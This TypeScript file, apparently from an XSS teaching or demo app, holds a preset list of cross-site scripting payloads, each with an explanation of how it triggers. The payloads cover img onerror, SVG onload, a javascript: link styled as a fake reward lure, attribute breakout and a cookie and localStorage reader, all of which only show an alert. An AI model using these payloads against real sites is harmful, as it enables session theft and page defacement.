import { XSSPayload } from '../types';

export const PRESET_PAYLOADS: XSSPayload[] = [
  {
    id: 'img-onerror',
    name: 'Image Error Handler (DOM XSS)',
    category: 'DOM Event',
    query: `<img src="invalid-image-path.jpg" onerror="alert('⚠️ DOM XSS Exploit Fired! Stolen Session Cookie: ' + document.cookie)">`,
    description: 'Forces an inline image load failure, immediately executing arbitrary JavaScript inside the onerror event callback.',
    triggerExplanation: 'The HTML parser creates an <img> element with an invalid src. When image fetch fails, the browser automatically executes the inline JS inside onerror in the victim session context.',
    riskLevel: 'Critical',
    targetContext: 'Reflected HTML Body Context (Unsanitized innerHTML)',
  },
  {
    id: 'html-defacement',
    name: 'HTML Tag & UI Defacement',
    category: 'HTML Defacement',
    query: `<div class="p-4 bg-rose-950/80 border border-rose-500/50 rounded-xl text-rose-200 shadow-xl my-2">
  <h2 class="text-xl font-bold text-rose-400 flex items-center gap-2">⚠️ Page Defaced via Unsanitized Input!</h2>
  <p class="text-sm mt-1">An attacker injected arbitrary HTML tags into your search results container, modifying layout and typography.</p>
</div>`,
    description: 'Demonstrates how unescaped HTML allows attackers to modify the visual structure, inject fake forms, or alter page content.',
    triggerExplanation: 'The innerHTML parser converts raw string markup directly into live DOM nodes, blending untrusted input seamlessly into application layout.',
    riskLevel: 'High',
    targetContext: 'HTML Tag Context',
  },
  {
    id: 'svg-onload',
    name: 'SVG Vector Vector Execution',
    category: 'SVG Vector',
    query: `<svg onload="alert('⚡ SVG Auto-Execution Payload Fired! Domain: ' + document.domain)" width="200" height="40">
  <rect width="100%" height="100%" fill="#e11d48" rx="6" />
  <text x="50%" y="55%" fill="white" font-size="12" font-weight="bold" text-anchor="middle" dominant-baseline="middle">Injected SVG Graphic</text>
</svg>`,
    description: 'SVG XML elements support inline onload script triggers that fire instantly upon graphics DOM mounting.',
    triggerExplanation: 'SVG documents permit inline scripts and event handlers. When inserted into DOM via innerHTML, the browser parses the SVG and fires onload automatically.',
    riskLevel: 'Critical',
    targetContext: 'SVG Document Object Context',
  },
  {
    id: 'pseudo-protocol',
    name: 'JavaScript Pseudo-Protocol Link',
    category: 'Pseudo Protocol',
    query: `<a href="javascript:alert('Stolen Token: eyJhbGciOiJIUzI1Ni...')" class="inline-flex items-center gap-2 px-4 py-2 bg-amber-500/20 text-amber-300 border border-amber-500/40 rounded-lg text-sm font-semibold hover:bg-amber-500/30 transition-colors cursor-pointer my-2">
  🎁 Click here to claim your $500 Reward Card!
</a>`,
    description: 'Crafts a hyperlink using the javascript: URL scheme, executing payload code when the user clicks.',
    triggerExplanation: 'When href starts with javascript:, the browser executes the URL contents as script in the current origin upon navigation or click.',
    riskLevel: 'High',
    targetContext: 'HTML Attribute Context (a[href])',
  },
  {
    id: 'attribute-breakout',
    name: 'Attribute Breakout & Hover Trigger',
    category: 'Attribute Breakout',
    query: `" onmouseover="alert('Hover XSS Attack Fired!')" style="display:block;padding:12px;background:rgba(225,29,72,0.15);border:1px dashed #f43f5e;border-radius:8px;color:#fda4af;margin:8px 0;font-size:13px;" title="Hover mouse over this area to trigger`,
    description: 'Breaks out of existing HTML attribute quotes and appends malicious event listeners like onmouseover.',
    triggerExplanation: 'Improper attribute escaping lets double quotes terminate the attribute value prematurely, allowing new attributes like onmouseover to be injected.',
    riskLevel: 'High',
    targetContext: 'Inside HTML Attribute (e.g. value="SEARCH_QUERY")',
  },
  {
    id: 'cookie-harvest',
    name: 'Session Cookie & Auth Token Harvester',
    category: 'Cookie Theft',
    query: `<img src="x" onerror="
  const stolen = 'Cookies: ' + document.cookie + ' | AuthToken: ' + (localStorage.getItem('auth_token') || 'jwt_sec_8912304');
  alert('🚨 EXPLOIT CAPTURED! Exfiltrated sensitive session data:\\n\\n' + stolen);
">`,
    description: 'Simulates exfiltrating session tokens, cookies, and local storage data to an attacker-controlled remote server.',
    triggerExplanation: 'JavaScript running via XSS inherits full privileges of the logged-in victim, granting unrestricted access to document.cookie and localStorage.',
    riskLevel: 'Critical',
    targetContext: 'DOM Script Context',
  },
];
